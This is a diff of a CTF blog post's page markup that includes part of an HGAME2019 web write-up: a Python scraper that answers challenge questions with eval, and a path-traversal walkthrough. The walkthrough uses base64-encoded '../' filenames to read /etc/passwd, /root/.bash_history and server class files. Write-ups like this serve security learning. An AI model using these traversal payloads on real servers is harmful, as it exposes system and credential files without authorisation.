class="string">"http://111.231.140.29:10000"</span></span><br><span class="line">url2 = <span class="string">"http://111.231.140.29:10000/question"</span></span><br><span class="line">url3 = <span class="string">"http://111.231.140.29:10000/solution"</span></span><br><span class="line">url4=<span class="string">'http://111.231.140.29:10000/statics/style.css'</span></span><br><span class="line"></span><br><span class="line">res = requests.post(url1,data=dict(token=token))</span><br><span class="line">cookies = res.cookies</span><br><span class="line">al_list = <span class="string">'1026943587'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    <span class="comment"># res = requests.get(url2,cookies=cookies,headers=headers)</span></span><br><span class="line">    print(<span class="string">'-------------round'</span>,i,<span class="string">'---------------'</span>)</span><br><span class="line">    exp = re.findall(<span class="string">r'&lt;span&gt;(.+)&lt;/span'</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">    print(exp)</span><br><span class="line">    data = dict(answer=str(eval(exp[:<span class="number">-2</span>])))</span><br><span class="line">    res = requests.post(url3,cookies=cookies,data=data,headers=headers)</span><br><span class="line">    cookies = res.cookies</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>,<span class="number">21</span>):</span><br><span class="line">    print(<span class="string">'-------------round'</span>,i,<span class="string">'---------------'</span>)</span><br><span class="line">    exp = re.findall(<span class="string">r'&lt;span&gt;(.+)&lt;/span'</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">    exp = list(exp)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(exp)):</span><br><span class="line">        <span class="keyword">if</span> ord(exp[x])&gt;<span class="number">47</span> <span class="keyword">and</span> ord(exp[x]) &lt; <span class="number">59</span>:</span><br><span class="line">            exp[x] = al_list[ord(exp[x])<span class="number">-48</span>]</span><br><span class="line">    exp = <span class="string">""</span>.join(exp)</span><br><span class="line">    print(exp)</span><br><span class="line">    data = dict(answer=str(eval(exp[:<span class="number">-2</span>])))</span><br><span class="line">    res = requests.post(url3,cookies=cookies,data=data,headers=headers)</span><br><span class="line">    cookies = res.cookies</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">21</span>,<span class="number">31</span>):</span><br><span class="line">    print(<span class="string">'-------------round'</span>,i,<span class="string">'---------------'</span>)</span><br><span class="line">    res = requests.get(url4,cookies=cookies,headers=headers)</span><br><span class="line">    exp = re.findall(<span class="string">r'content:"(.+)"'</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">    print(exp)</span><br><span class="line">    data = dict(answer=str(eval(exp[:<span class="number">-2</span>])))</span><br><span class="line">    res = requests.post(url3,cookies=cookies,data=data,headers=headers)</span><br><span class="line">    cookies = res.cookies</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'hgame'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(res.text)</span><br></pre></td></tr></table></div></figure>
 <p>flag如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;e7b2703a92574012c10a90d0c96051a5b38c8d60a8861c66e7a0898812144083&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="Math有趣"><a href="#Math有趣" class="headerlink" title="Math有趣"></a>Math有趣</h2><p>先是一道数学题，到了第二题之后是一个图片，点击图片链接，发现链接有猫腻<code>img/cXVlc3Rpb24ucG5n.php</code>，base64解码之后是<code>question.png</code>，尝试了一下<code>../../../../../etc/passwd</code>(base64编码)，发现可以成功读取文件<br><img src="https://i.loli.net/2019/02/12/5c623f9854da7.png" alt="/etc/passwd"><br>接下来就是探测工作目录了，学到一个东西，可以探测<code>.bash_history</code>，该文件记录了最近的bash命令<code>../../../../../root/.bash_history</code></p>
-<p><img src="https://i.loli.net/2019/02/12/5c6240665dab0.png" alt=""></p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;e7b2703a92574012c10a90d0c96051a5b38c8d60a8861c66e7a0898812144083&#125;</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="Math有趣">
+          <a href="#Math有趣" class="heading-link"><i class="fas fa-link"></i></a>Math有趣</h2>
+      <p>先是一道数学题，到了第二题之后是一个图片，点击图片链接，发现链接有猫腻<code>img/cXVlc3Rpb24ucG5n.php</code>，base64解码之后是<code>question.png</code>，尝试了一下<code>../../../../../etc/passwd</code>(base64编码)，发现可以成功读取文件<br><img src="https://i.loli.net/2019/02/12/5c623f9854da7.png" alt="/etc/passwd"><br>接下来就是探测工作目录了，学到一个东西，可以探测<code>.bash_history</code>，该文件记录了最近的bash命令<code>../../../../../root/.bash_history</code></p>
+<p><img src="https://i.loli.net/2019/02/12/5c6240665dab0.png" alt></p>
 <p>工作目录为<code>/usr/local/tomcat/webapps/ROOT</code></p>
 <p>接下来我们可以给链接加<code>=</code>诱发报错</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.tan90.me:8080/img/cXVlc3Rpb24ucG5n=.php</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2019/02/12/5c6240ecc59e8.png" alt=""></p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.tan90.me:8080&#x2F;img&#x2F;cXVlc3Rpb24ucG5n&#x3D;.php</span><br></pre></td></tr></table></div></figure>
+<p><img src="https://i.loli.net/2019/02/12/5c6240ecc59e8.png" alt></p>
 <p>最终定位到类目录，读取代码<code>../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/hgame/controller/MathController.class</code></p>
 <p>然后反编译，定位到flag的位置</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/flag"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Flag</span><span class="params">(ModelMap model)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"This is the last question."</span>);</span><br><span class="line">    System.out.println(<span class="string">"123852^x % 612799081 = 6181254136845 % 612799081"</span>);</span><br><span class="line">    System.out.println(<span class="string">"The flag is hgame&#123;x&#125;.x is a decimal number."</span>);</span><br><span class="line">    model.addAttribute(<span class="string">"flag"</span>, <span class="string">"Flag is not here."</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"flag"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/flag"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Flag</span><span class="params">(ModelMap model)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"This is the last question."</span>);</span><br><span class="line">    System.out.println(<span class="string">"123852^x % 612799081 = 6181254136845 % 612799081"</span>);</span><br><span class="line">    System.out.println(<span class="string">"The flag is hgame&#123;x&#125;.x is a decimal number."</span>);</span><br><span class="line">    model.addAttribute(<span class="string">"flag"</span>, <span class="string">"Flag is not here."</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"flag"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
 <p>这个数学问题可以用<strong>Baby Step Giant Step</strong>算法解决，github上有相关的代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py bsgs.py 123852 6181254136845 612799081</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py bsgs.py 123852 6181254136845 612799081</span><br></pre></td></tr></table></div></figure>
 <p>可以得到最小的答案是<code>15387368</code></p>
 <p>flag如下：<code>hgame{15387368}</code></p>
-
-      
-    </div>
-
-    
-
-    
-    
-    
-
-  <div>
-    
-      <div>
-    
-        <div style="text-align:center;color: #4b4b4b;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
-    
-</div>
-    
-  </div>
-
-    
-
-    
-      
-    
-    
-      <div>
-        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
-  <div>您今天怎么辣么迷人！</div>
-  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
-    <span>Donate</span>
-  </button>
-  <div id="QR" style="display: none;">
-
-    
-      <div id="wechat" style="display: inline-block">
-        <img id="wechat_qr" src="/images/reward-wechat.png" alt="Aesm1p WeChat Pay"/>
-        <p>WeChat Pay</p>
-      </div>
-    
-
-    
-      <div id="alipay" style="display: inline-block">
-        <img id="alipay_qr" src="/images/reward-alipay.jpg" alt="Aesm1p Alipay"/>
-        <p>Alipay</p>
-      </div>
-    
-
-    
-
-  </div>
-</div>
-
-      </div>
-    
-
-    
-      <div>
-        
-
-
-
-  
-
-
-
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>Post author:  </strong>Aesm1p</li>
-  <li class="post-copyright-link">
-    <strong>Post link: </strong>
-    
-    <a href="http://chaosec.top/2019/01/30/hgame2019/" title="HGAME2019-Web-Week1&2">http://chaosec.top/2019/01/30/hgame2019/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.</li>
-</ul>
-
-      </div>
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/CTF/" rel="tag"># CTF</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2019/01/15/crypto2/" rel="next" title="密码学作业记录（二）">
-                <i class="fa fa-chevron-left"></i> 密码学作业记录（二）
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/01/30/cumtctf2/" rel="prev" title="CUMTCTF第二轮月赛">
-                CUMTCTF第二轮月赛 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-  </div>
-
-
-          </div>
-          
-
-  
-
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
-          </li>
-        </ul>
-      
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image"
-                src="/images/avatar.jpg"
-                alt="Aesm1p"/>
-            
-              <p class="site-author-name" itemprop="name">Aesm1p</p>
-              <p class="site-description motion-element" itemprop="description">相逢意气为君饮</p>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
-                
-                  <a href="/archives">
-                
-                    <span class="site-state-item-count">34</span>
-                    <span class="site-state-item-name">posts</span>
-                  </a>
-                </div>
-              
-
-              
-                
-                
-                <div class="site-state-item site-state-categories">
-                  <a href="/categories/index-2.html">
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">6</span>
-                    <span class="site-state-item-name">categories</span>
-                  </a>
-                </div>
-              
-
-              
-                
-                
-                <div class="site-state-item site-state-tags">
-                  <a href="/tags/index.html">
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">16</span>
-                    <span class="site-state-item-name">tags</span>
-                  </a>
-                </div>
-              
-            </nav>
-          
-
-          
-            <div class="feed-link motion-element">
-              <a href="/atom.xml" rel="alternate">
-                <i class="fa fa-rss"></i>
-                RSS
-              </a>
-            </div>
-          
-
-          
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  
-                  
-                  
-                    
-                  
-                  <a href="https://github.com/PPointCharles" title="GitHub &rarr; https://github.com/PPointCharles" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i></a>
-                </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                  
-                    
-                  
-                  <a href="mailto:1426594174@qq.com" title="E-Mail &rarr; mailto:1426594174@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i></a>
-                </span>
-              
-            </div>
-          
-
-          
-             <div class="cc-license motion-element" itemprop="license">
-              
-                
-              
-              
-              
-              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"/></a>
-             </div>
-          
-
-          
-          
-
-          
-            
-          
-          
-
-        </div>
-      </div>
-
-      
-      <!--noindex-->
-        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-            
-            
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#week-1"><span class="nav-number">2.</span> <span class="nav-text"><a href="#week-1" class="headerlink" title="week-1"></a>week-1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#谁吃了我的flag"><span class="nav-number">2.1.</span> <span class="nav-text"><a href="#&#x8C01;&#x5403;&#x4E86;&#x6211;&#x7684;flag" class="headerlink" title="&#x8C01;&#x5403;&#x4E86;&#x6211;&#x7684;flag"></a>&#x8C01;&#x5403;&#x4E86;&#x6211;&#x7684;flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#very-easy-web"><span class="nav-number">2.2.</span> <span class="nav-text"><a href="#very-easy-web" class="headerlink" title="very easy web"></a>very easy web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#换头大作战"><span class="nav-number">2.3.</span> <span class="nav-text"><a href="#&#x6362;&#x5934;&#x5927;&#x4F5C;&#x6218;" class="headerlink" title="&#x6362;&#x5934;&#x5927;&#x4F5C;&#x6218;"></a>&#x6362;&#x5934;&#x5927;&#x4F5C;&#x6218;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#can-u-find-me"><span class="nav-number">2.4.</span> <span class="nav-text"><a href="#can-u-find-me" class="headerlink" title="can u find me?"></a>can u find me?</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#week-2"><span class="nav-number">3.</span> <span class="nav-text"><a href="#week-2" class="headerlink" title="week-2"></a>week-2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-php"><span class="nav-number">3.1.</span> <span class="nav-text"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php-trick"><span class="nav-number">3.2.</span> <span class="nav-text"><a href="#php-trick" class="headerlink" title="php trick"></a>php trick</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-Is-The-Best-Language"><span class="nav-number">3.3.</span> <span class="nav-text"><a href="#PHP-Is-The-Best-Language" class="headerlink" title="PHP Is The Best Language"></a>PHP Is The Best Language</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Baby-Spider"><span class="nav-number">3.4.</span> <span class="nav-text"><a href="#Baby-Spider" class="headerlink" title="Baby_Spider"></a>Baby_Spider</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Math有趣"><span class="nav-number">3.5.</span> <span class="nav-text"><a href="#Math&#x6709;&#x8DA3;" class="headerlink" title="Math&#x6709;&#x8DA3;"></a>Math&#x6709;&#x8DA3;</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </div>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Aesm1p</span>
-
-  
-
-  
-</div>
-
-
-
-
-
-
-
-
-
-        
-<div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-  
-    <span class="post-meta-item-icon">
-      <i class="fa fa-user"></i>
-    </span>
-    <span class="site-uv" title="Total Visitors">
-      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
-    </span>
-  
-
-  
-    <span class="post-meta-divider">|</span>
-  
-
-  
-    <span class="post-meta-item-icon">
-      <i class="fa fa-eye"></i>
-    </span>
-    <span class="site-pv" title="Total Views">
-      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
-    </span>
-  
-</div>
-
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-    
-
-    
-  </div>
-
-  
-
-<script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://chaosec.top">Aesm1p</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://chaosec.top/2019/01/30/hgame2019/">http://chaosec.top/2019/01/30/hgame2019/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://chaosec.top/tags/CTF/">CTF</a></span></div><div class="post-reward reward"><div class="reward-button">Buy me a coffee</div><div class="reward-qrcode"><span class="reward-qrcode-alipay"><img class="reward-qrcode-alipay__img" src="/assets/reward-alipay.jpg"><div class="reward-qrcode-alipay__text">Alipay</div></span><span class="reward-qrcode-wechat"><img class="reward-qrcode-wechat__img" src="/assets/reward-wechat.png"><div class="reward-qrcode-wechat__text">Wechat</div></span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2019/01/30/cumtctf2/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">CUMTCTF第二轮月赛</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2019/01/15/crypto2/"><span class="paginator-prev__text">密码学作业记录（二）</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2020</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Aesm1p</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
   }
-</script>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-    
-    
-  
-  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
-
-
-
-  
-  
-
-
-
-
-
-
-
-
-
-
-
-  
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-  
-  <script src="/lib/three/three.min.js"></script>
-
-  
-  <script src="/lib/three/three-waves.min.js"></script>
-
-
-  
-
-
-  <script src="/js/src/utils.js?v=6.7.0"></script>
-
-  <script src="/js/src/motion.js?v=6.7.0"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/src/affix.js?v=6.7.0"></script>
-
-  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>
-
-
-
-
-  
-  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
-<script src="/js/src/post-details.js?v=6.7.0"></script>
-
-
-
-  
-
-
-  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
-
-
-
-  
-
-
-  
-
-
-  
-
-  <script>
-    // Popup Window;
-    var isfetched = false;
-    var isXml = true;
-    // Search DB path;
-    var search_path = "search.xml";
-    if (search_path.length === 0) {
-      search_path = "search.xml";
-    } else if (/json$/i.test(search_path)) {
-      isXml = false;
-    }
-    var path = "/" + search_path;
-    // monitor main search box;
-
-    var onPopupClose = function (e) {
-      $('.popup').hide();
-      $('#local-search-input').val('');
-      $('.search-result-list').remove();
-      $('#no-result').remove();
-      $(".local-search-pop-overlay").remove();
-      $('body').css('overflow', '');
-    }
-
-    function proceedsearch() {
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
-        .css('overflow', 'hidden');
-      $('.search-popup-overlay').click(onPopupClose);
-      $('.popup').toggle();
-      var $localSearchInput = $('#local-search-input');
-      $localSearchInput.attr("autocapitalize", "none");
-      $localSearchInput.attr("autocorrect", "off");
-      $localSearchInput.focus();
-    }
-
-    // search function;
-    var searchFunc = function(path, search_id, content_id) {
-      'use strict';
-
-      // start loading animation
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
-          '<div id="search-loading-icon">' +
-          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
-          '</div>' +
-          '</div>')
-        .css('overflow', 'hidden');
-      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
-
-      
-
-      $.ajax({
-        url: path,
-        dataType: isXml ? "xml" : "json",
-        async: true,
-        success: function(res) {
-          // get the contents from search data
-          isfetched = true;
-          $('.popup').detach().appendTo('.header-inner');
-          var datas = isXml ? $("entry", res).map(function() {
-            return {
-              title: $("title", this).text(),
-              content: $("content",this).text(),
-              url: $("url" , this).text()
-            };
-          }).get() : res;
-          var input = document.getElementById(search_id);
-          var resultContent = document.getElementById(content_id);
-          var inputEventFunction = function() {
-            var searchText = input.value.trim().toLowerCase();
-            var keywords = searchText.split(/[\s\-]+/);
-            if (keywords.length > 1) {
-              keywords.push(searchText);
-            }
-            var resultItems = [];
-            if (searchText.length > 0) {
-              // perform local searching
-              datas.forEach(function(data) {
-                var isMatch = false;
-                var hitCount = 0;
-                var searchTextCount = 0;
-                var title = data.title.trim();
-                var titleInLowerCase = title.toLowerCase();
-                var content = data.content.trim().replace(/<[^>]+>/g,"");
-                
-                var contentInLowerCase = content.toLowerCase();
-                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
-                var indexOfTitle = [];
-                var indexOfContent = [];
-                // only match articles with not empty titles
-                if(title != '') {
-                  keywords.forEach(function(keyword) {
-                    function getIndexByWord(word, text, caseSensitive) {
-                      var wordLen = word.length;
-                      if (wordLen === 0) {
-                        return [];
-                      }
-                      var startPosition = 0, position = [], index = [];
-                      if (!caseSensitive) {
-                        text = text.toLowerCase();
-                        word = word.toLowerCase();
-                      }
-                      while ((position = text.indexOf(word, startPosition)) > -1) {
-                        index.push({position: position, word: word});
-                        startPosition = position + wordLen;
-                      }
-                      return index;
-                    }
-
-                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
-                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
-                  });
-                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
-                    isMatch = true;
-                    hitCount = indexOfTitle.length + indexOfContent.length;
-                  }
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ Untitled ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
                 }
 
-                // show search results
-
-                if (isMatch) {
-                  // sort index by position of keyword
-
-                  [indexOfTitle, indexOfContent].forEach(function (index) {
-                    index.sort(function (itemLeft, itemRight) {
-                      if (itemRight.position !== itemLeft.position) {
-                        return itemRight.position - itemLeft.position;
-                      } else {
-                        return itemLeft.word.length - itemRight.word.length;
-                      }
-                    });
-                  });
-
-                  // merge hits into slices
-
-                  function mergeIntoSlice(text, start, end, index) {
-                    var item = index[index.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    var hits = [];
-                    var searchTextCountInSlice = 0;
-                    while (position + word.length <= end && index.length != 0) {
-                      if (word === searchText) {
-                        searchTextCountInSlice++;
-                      }
-                      hits.push({position: position, length: word.length});
-                      var wordEnd = position + word.length;
-
-                      // move to next position of hit
-
-                      index.pop();
-                      while (index.length != 0) {
-                        item = index[index.length - 1];
-                        position = item.position;
-                        word = item.word;
-                        if (wordEnd > position) {
-                          index.pop();
-                        } else {
-                          break;
-                        }
-                      }
-                    }
-                    searchTextCount += searchTextCountInSlice;
-                    return {
